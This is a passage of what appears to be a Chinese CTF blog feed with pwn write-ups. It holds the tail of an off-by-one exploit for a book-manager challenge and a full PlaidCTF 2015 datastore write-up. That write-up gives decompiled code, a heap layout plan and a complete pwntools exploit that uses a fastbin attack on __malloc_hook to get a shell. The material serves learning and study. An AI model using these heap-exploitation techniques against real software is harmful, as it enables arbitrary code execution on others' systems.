sla(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    log.info(<span class="string">&quot;Delete&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span>(<span class="params">idx, description</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;Enter new book description&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;: &quot;</span>, description)</span><br><span class="line">    log.info(<span class="string">&quot;Edit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_book</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(idx):</span><br><span class="line">        ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        book_id = <span class="built_in">int</span>(rl()[:-<span class="number">1</span>])</span><br><span class="line">        ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        book_name = rl()[:-<span class="number">1</span>]</span><br><span class="line">        ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        book_des = rl()[:-<span class="number">1</span>]</span><br><span class="line">        ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        book_author = rl()[:-<span class="number">1</span>]</span><br><span class="line">    log.info(<span class="string">&quot;print_book&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span>(<span class="params">name</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter author name: &quot;</span>, name)</span><br><span class="line">    log.info(<span class="string">&quot;change name&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_name</span>(<span class="params">name</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;name:&quot;</span>, name)</span><br><span class="line"></span><br><span class="line">create_name(<span class="string">&quot;A&quot;</span> * <span class="number">32</span>)</span><br><span class="line">create_book(<span class="number">0x1d8</span>, <span class="string">&quot;a&quot;</span>, <span class="number">32</span>, <span class="string">&quot;b&quot;</span>) <span class="comment"># 使得 book1-&gt;description 的地址低位为 00</span></span><br><span class="line">create_book(<span class="number">0x21000</span>, <span class="string">&quot;c&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;d&quot;</span>)</span><br><span class="line"></span><br><span class="line">book_id, book_name, book_des, book_author = print_book(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;A&quot;</span>*<span class="number">32</span>)</span><br><span class="line">book1_addr = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.info(<span class="string">&quot;book1_addr: &quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(book1_addr + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(<span class="number">1</span>, payload)</span><br><span class="line">change_name(<span class="string">&quot;A&quot;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book_id, book_name, book_des, book_author = print_book(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.info(<span class="string">&quot;book2_des_addr: &quot;</span> + <span class="built_in">hex</span>(book2_des_addr))</span><br><span class="line">libc.address = book2_des_addr - <span class="number">0x575010</span></span><br><span class="line">log.info(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc.address + <span class="number">0xd5bf7</span>  <span class="comment"># 0x3f3d6 0x3f42a 0xd5bf7</span></span><br><span class="line">log.info(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.info(<span class="string">&quot;one_gadget: &quot;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">edit_book(<span class="number">1</span>, p64(free_hook))</span><br><span class="line"><span class="comment"># dbg(&quot;*(0x555555554000 + 0x000000000000B23)&quot;)</span></span><br><span class="line">edit_book(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete_book(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>其中构造 book1-&gt;description 地址低位为 00 , ctf-wiki中为 128, 这里我根据实际情况修改为 0x1d8。</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
            <tag> Off By One </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>plaidctf 2015 plaiddb</title>
      <link href="/wp-item-plaidctf-2015-plaiddb/"/>
      <url>/wp-item-plaidctf-2015-plaiddb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="plaidctf-2015-plaiddb"><a href="#plaidctf-2015-plaiddb" class="headerlink" title="plaidctf 2015 plaiddb"></a>plaidctf 2015 plaiddb</h2><ul><li><p>题目: <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/2015_plaidctf_datastore">2015_plaidctf_datastore</a></p></li><li><p>libc version: 2.23</p></li><li><p><code>checksec datastore</code> 64 位程序且保护全开</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  2015_plaidctf_datastore checksec datastore</span><br><span class="line">  [*] <span class="string">&#x27;/mnt/d/Users/Lantern/Desktop/note/pwn_note/items/2015_plaidctf_datastore/datastore&#x27;</span></span><br><span class="line">  Arch:     amd64-64-little</span><br><span class="line">  RELRO:    Full RELRO</span><br><span class="line">  Stack:    Canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      PIE enabled</span><br><span class="line">  FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="关键数据结构"><a href="#关键数据结构" class="headerlink" title="关键数据结构"></a>关键数据结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 row             struc ; (sizeof=0x38, mappedto_6)</span><br><span class="line">00000000 key             dq ?                    ; offset</span><br><span class="line">00000008 data_size       dq ?</span><br><span class="line">00000010 data            dq ?                    ; offset</span><br><span class="line">00000018 left_node       dq ?                    ; offset</span><br><span class="line">00000020 right_node      dq ?                    ; offset</span><br><span class="line">00000028 dummy           dq ?                    ; offset</span><br><span class="line">00000030 dummy1          dd ?</span><br><span class="line">00000034 padding         dd ?</span><br><span class="line">00000038 row             ends</span><br></pre></td></tr></table></figure><p>使用二叉树结构存储数据</p><h3 id="函数功能"><a href="#函数功能" class="headerlink" title="函数功能"></a>函数功能</h3><p>需要注意的是<code>getline</code>函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">get_line</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *line_start; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *line_end; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *new_line; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  line_start = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">8uLL</span>);            <span class="comment">// 一开始使用 malloc(8) 进行分配</span></span><br><span class="line">  line_end = line_start;</span><br><span class="line">  size = malloc_usable_size(line_start);        <span class="comment">// 计算了可用大小, 例如对于 malloc(8) 来说, 这里应该为24</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      Goodbye();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = line_end - line_start;</span><br><span class="line">    <span class="keyword">if</span> ( size &lt;= line_end - line_start )</span><br><span class="line">    &#123;</span><br><span class="line">      new_line = (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(line_start, <span class="number">2</span> * size);<span class="comment">// // 大小不够是将可用大小乘二, 进行 realloc</span></span><br><span class="line">      line_start = new_line;</span><br><span class="line">      <span class="keyword">if</span> ( !new_line )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;FATAL: Out of memory&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      line_end = &amp;new_line[v5];</span><br><span class="line">      size = malloc_usable_size(new_line);</span><br><span class="line">    &#125;</span><br><span class="line">    *line_end++ = v4;                           <span class="comment">// &lt;--- 漏洞所在, 此时 line_end 作为索引, 指向了下一个位置, 如果位置全部使用完毕则会指向下一个本应该不可写位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  *line_end = <span class="number">0</span>;                                <span class="comment">// &lt;--- 漏洞所在。 off by one （NULL 字节溢出）</span></span><br><span class="line">  <span class="keyword">return</span> line_start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单功能:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> command[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;PROMPT: Enter command:&quot;</span>);</span><br><span class="line">  my_fgets(command, <span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(command, <span class="string">&quot;GET\n&quot;</span>, <span class="number">5uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    Get();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(command, <span class="string">&quot;PUT\n&quot;</span>, <span class="number">5uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    PUT();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(command, <span class="string">&quot;DUMP\n&quot;</span>, <span class="number">6uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    DUMP();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(command, <span class="string">&quot;DEL\n&quot;</span>, <span class="number">5uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    DEL();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(command, <span class="string">&quot;EXIT\n&quot;</span>, <span class="number">6uLL</span>) )</span><br><span class="line">      Goodbye();</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;ERROR: &#x27;%s&#x27; is not a valid command.\n&quot;</span>, command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>DUMP</code> 和 <code>GET</code> 都是用来读取内容的, 这样<code>key</code>和具体数据内容都可以读取, 不需要重点关注。重点关注<code>PUT</code>和<code>DEL</code>:</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PUT</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  row *row; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  row *v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> data_size[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  row = (row *)<span class="built_in">malloc</span>(<span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !row )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;PROMPT: Enter row key:&quot;</span>);</span><br><span class="line">  row-&gt;key = get_line();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;PROMPT: Enter data size:&quot;</span>);</span><br><span class="line">  my_fgets(data_size, <span class="number">16LL</span>);</span><br><span class="line">  size = strtoul(data_size, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">  row-&gt;data_size = size;</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  row-&gt;data = v2;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ERROR: Can&#x27;t store that much data.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(row-&gt;key);</span><br><span class="line">    <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(row);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;FATAL: Can&#x27;t allocate a row&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;PROMPT: Enter data:&quot;</span>);</span><br><span class="line">  my_fread(row-&gt;data, row-&gt;data_size);</span><br><span class="line">  v3 = sub_CF0(row);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(row-&gt;key);</span><br><span class="line">    <span class="built_in">free</span>(v3-&gt;data);</span><br><span class="line">    v3-&gt;data_size = row-&gt;data_size;</span><br><span class="line">    v3-&gt;data = row-&gt;data;</span><br><span class="line">    <span class="built_in">free</span>(row);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;INFO: Update successful.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;INFO: Insert successful.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v5 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配过程有:</p><ol><li>malloc(0x38) (结构体)</li><li>getline (malloc 和 realloc)</li><li>malloc(size) 可控大小</li><li>读入 size 字节内容</li></ol><p>更复杂的部分我们可以之后在看是否会用到, 也就是在 put 中用到的关于 free 的部分</p><p>对于删除来说, 这个函数比较复杂, 就不再详细解释。事实上只需要知道他是按照 key 来进行删除, key 则使用 getline 进行读取, 如果没有该 key, 则 getline 的部分不会被删除, 有的话, 就依次 free</p><h3 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h3><p>漏洞的位置在功能分析中已经指出来了, 在 getline 当中, 但是这个函数比较特殊的地方在于, 它所分配的大小是逐渐增大的, 通过可用大小乘二的方式增大, 使用了 realloc, 也就是说, 我们想要触发这个漏洞, 就需要满足特定大小的要求。</p><p>根据分配过程, 满足的大小有:</p><ul><li>0x18</li><li>0x38</li><li>0x78</li><li>0xf8</li><li>0x1f8</li><li>…</li></ul><p>这些大小都可以触发溢出。首先 off-by-one 漏洞可以造成堆交叉, 可以造成 libc 地址泄露, 之后所要采用的利用方法, 由于已经存在堆交叉, 也就是可以形成 UAF , 可以使用 UAF 的常用方法。</p><p>UAF 漏洞最简单的方法当然是 fastbin attack 了, 所以作者采用了 fastbin attack</p><p>到这里, 开始思考如何形成我们所需要的利用条件。off-by-one最终的效果是可以将一个释放状态的 smallbin chunk 或是 unsortedbin chunk 一直到被溢出 chunk 合并成一个大 chunk。也就是说:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|            |  &lt;-- free 的 unsortedbin 或是 smallbin chunk （因为此时 fd 和 bk 指向合法指针, 才能够进行 unlink）</span><br><span class="line">+------------+</span><br><span class="line">|     ...    |  &lt;-- 任意 chunk</span><br><span class="line">+------------+</span><br><span class="line">|            |  &lt;-- 进行溢出的 chunk</span><br><span class="line">+------------+</span><br><span class="line">|    vuln    |  &lt;-- 被溢出的 chunk, 大小为 0x_00 （例如 0x100, 0x200……）</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p>在 off-by-one 利用后, 以上出现的 chunk 都将被合并为一个释放状态的 chunk。这样中间任意 chunk 的位置如果是已被分配的, 就可以造成 overlap 了。</p><p>按照我们的利用思路, 结合题目 getline 函数通过 malloc(8) 再 realloc 的分配方式, 我们需要:</p><ol><li>任意 chunk 位置至少有一个已经分配, 且可以读出数据的 chunk 来 leak libc_base_address</li><li>进行溢出的 chunk 需要在最上方的 chunk 之前分配, 否则<code>malloc(8)</code>的时候会分配到最上方而不是进行溢出 chunk 应在的位置</li><li>任意 chunk 位置至少还需要一个已经被释放, 且 size 为 0x71 的 chunk 来进行 fastbin attack</li><li>所有 chunk 不应该被合并到 top chunk 中, 所以最下方应该有一个已经分配好的 chunk 保证与 top chunk 的距离</li><li>进行溢出的 chunk 大小应该属于 unsortedbin 或是 smallbin, 不能为 fastbin, 否则被释放之后, 按照 getline 的分配方式, malloc(8) 无法分配在该位置</li></ol><p>按照以上原则, 我们可以思考出 chunk 的分布如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|      1     |  &lt;-- free 的 size == 0x200 chunk</span><br><span class="line">+------------+</span><br><span class="line">|      2     |  &lt;-- size == 0x60 fastbin chunk, 已被分配, 且可以读出数据</span><br><span class="line">+------------+</span><br><span class="line">|      5     |  &lt;-- size == 0x71 fastbin chunk, 为 fastbin attack 做准备</span><br><span class="line">+------------+</span><br><span class="line">|      3     |  &lt;-- size == 0x1f8 free 状态的 smallbin/unsortedbin chunk</span><br><span class="line">+------------+</span><br><span class="line">|      4     |  &lt;-- size == 0x101 被溢出 chunk</span><br><span class="line">+------------+</span><br><span class="line">|      X     |  &lt;-- 任意分配后 chunk 防止 top 合并</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p>由于分配过程还有一些额外结构（结构体本身的分配和 getline）, 我们需要先释放出足够的 fastbin chunk 来避免结构体本身的分配对我们的过程造成影响。</p><p>在此之后, 依次释放掉 5, 3, 1, 之后利用 del 输入时候的 getline, 将 3 填满, 造成 off-by-one, 之后将 4 free 掉进行合并（伪造 prev_size）, 这样就有了一个交叉的堆结构了。</p><p>之后的过程就更加简单了, 首先分配 1 的大小, 使得 libc 地址被写到 2 里, 就可以泄露出地址, 然后将 5 分配出来, 写入需要的内容, 就可以 fastbin attack 了。</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><ul><li>按照作者所说<code>由于原 libc 为 2.19 版本, 加载有一些奇怪的问题, 较为麻烦, 而本题没有用到 2.19 独有的特性, 所以我采用了 2.23 的 libc 进行调试, 版本为 ubuntu10。</code>, 因此这里我的测试环境为<code>wsl2 + pwndocker + libc 2.23</code></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./datastore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GET</span>(<span class="params">row_key</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;PROMPT: Enter command:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;PROMPT: Enter row key:\n&#x27;</span>, row_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PUT</span>(<span class="params">row_key, size, data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;PROMPT: Enter command:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;PUT&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;PROMPT: Enter row key:\n&#x27;</span>, row_key)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;PROMPT: Enter data size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(data) &lt; size):</span><br><span class="line">        data = data.ljust(size, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;PROMPT: Enter data:\n&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DUMP</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;PROMPT: Enter command:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;DUMP&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEL</span>(<span class="params">row_key</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;PROMPT: Enter command:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;DEL&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;PROMPT: Enter row key:\n&quot;</span>, row_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EXIT</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;PROMPT: Enter command:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;EXIT&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 因为每个功能函数都用到了0x38 chunk, 所以我们先构造一些, 避免影响后面的利用</span></span><br><span class="line">    PUT(<span class="built_in">str</span>(i), <span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    DEL(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PUT(<span class="string">&#x27;x&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;x&#x27;</span> * <span class="number">0x200</span>)</span><br><span class="line">PUT(<span class="string">&#x27;fast&#x27;</span>, <span class="number">0x68</span>, <span class="string">b&#x27;fast&#x27;</span>)</span><br><span class="line">PUT(<span class="string">&#x27;fast2&#x27;</span>, <span class="number">0x68</span>, <span class="string">b&#x27;fast2&#x27;</span>)</span><br><span class="line">PUT(<span class="string">&#x27;a&#x27;</span>, <span class="number">0x1f8</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line">PUT(<span class="string">&#x27;b&#x27;</span>, <span class="number">0xf0</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line">PUT(<span class="string">&#x27;defense&#x27;</span>, <span class="number">0x400</span>, <span class="string">b&#x27;defense-data&#x27;</span>)  <span class="comment"># 防止top bin的影响</span></span><br><span class="line">DEL(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">DEL(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">DEL(<span class="string">b&#x27;1&#x27;</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x4f0</span>))  <span class="comment"># 对b的pre_size域和prev_inuse进行覆盖</span></span><br><span class="line">DEL(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">PUT(<span class="string">&#x27;0x200&#x27;</span>, <span class="number">0x200</span>, <span class="string">b&#x27;0x200&#x27;</span>)</span><br><span class="line">PUT(<span class="string">&#x27;0x200plus&#x27;</span>, <span class="number">0x200</span>, <span class="string">b&#x27;0x200&#x27;</span>)</span><br><span class="line">GET(<span class="string">&#x27;fast&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;]:\n&#x27;</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak-(<span class="number">0x7ffff7dd1b78</span>-<span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">DEL(<span class="string">&#x27;fast2&#x27;</span>)</span><br><span class="line">PUT(<span class="string">&#x27;0x68+0x68&#x27;</span>, <span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0x71</span>) +</span><br><span class="line">    p64(libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">10</span>-<span class="number">0x10</span>+<span class="number">7</span>))</span><br><span class="line">PUT(<span class="string">&#x27;pre&#x27;</span>, <span class="number">0x68</span>, <span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">one_gadget_offset = <span class="number">0x4526a</span></span><br><span class="line">one_gadget = one_gadget_offset+libc_base</span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;read&quot;)</span></span><br><span class="line">PUT(<span class="string">&#x27;attack&#x27;</span>, <span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">GET(<span class="string">&#x27;fast&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
            <tag> Off By One </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf-2016-freenote</title>
      <link href="/wp-item-0ctf-2016-freenote/"/>
      <url>/wp-item-0ctf-2016-freenote/</url>
      
